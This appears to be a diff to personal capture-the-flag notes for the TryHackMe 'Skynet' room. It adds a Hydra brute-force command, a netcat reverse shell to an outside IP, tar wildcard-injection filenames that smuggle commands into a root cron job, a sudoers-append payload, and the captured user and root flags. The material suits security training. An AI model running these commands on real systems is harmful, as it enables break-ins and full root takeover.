@@ -69,8 +69,12 @@ Walterminator
 
 
 Open Burp ---> clear $ ---> add $ secretkey=
-load wordlist log1.txt
+load wordlist log1.txt ---> start attack
 --> cyborg007haloterminator with status 302
+
+
+OR use hydra
+hydra -l milesdyson -P log1.txt 10.10.1.235 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." 
 
 login http://10.10.69.49/squirrelmail/
 milesdyson:cyborg007haloterminator
@@ -180,11 +184,89 @@ http://10.10.69.49/45kra24zxs28v3yd/administrator//alerts/alertConfigField.php?u
 
 on my machine
 nc -lnvp 1234
+$whoami
+www-data
 
+- What is the user flag?
+hint:$whoami
+www-data
+$python -c "import pty; pty.spawn('/bin/bash')"
+www-data@skynet:/tmp$ su milesdyson
+su milesdyson
+Password: cyborg007haloterminator
+cat /home/milesdyson/user.txt
+7ce5c2109a40f958099283600a9ae807
+
+
+What is the root flag?
+hint:
+on my machine
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+on target machine
+cd /tmp
+wget http://myip:8000/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+.....
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+....
+view /home/milesdyson/backups/backup.sh
+cat /home/milesdyson/backups/backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
+
+
+(try https://gtfobins.github.io/gtfobins/tar/)
+
+Run the following commands as “www-data” user (not milesdyson).
+milesdyson@skynet$exit
+
+www-data@skynet:/tmp$ cd /var/www/html
+www-data@skynet$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.88.227 4445 >/tmp/f" > shell.sh
+www-data@skynet$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+www-data@skynet$ touch "/var/www/html/--checkpoint=1"
+www-data@skynet$ chmod +x shell.sh
+
+on my machine nc -lnvp 4445
+#whoami
+root
+cat /root/root.txt
+
+
+OR $cd /var/www/html
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+touch "/var/www/html/--checkpoint=1"
+sudo su
+#whoami
+root
+
+
+3f0372db24753accc7179a282cd6a949
 
 https://tryhackme.com/room/skynet
-https://whitehat.vn/threads/web-pentest-bai-2-su-dung-ky-thuat-brute-force-de-do-tim-duong-dan-va-password.14754/
 https://blog.tryhackme.com/skynet-writeup/
-
 https://github.com/Kahvi-0/Writeups/blob/master/TryHackMe/Skynet.md
 https://seceng.tech/2020/11/04/tryhackme-skynet-write-up/
+https://www.aldeid.com/wiki/TryHackMe-Skynet
+https://medium.com/azkrath/tryhackme-walkthrough-skynet-69399702ee5a  <---ok
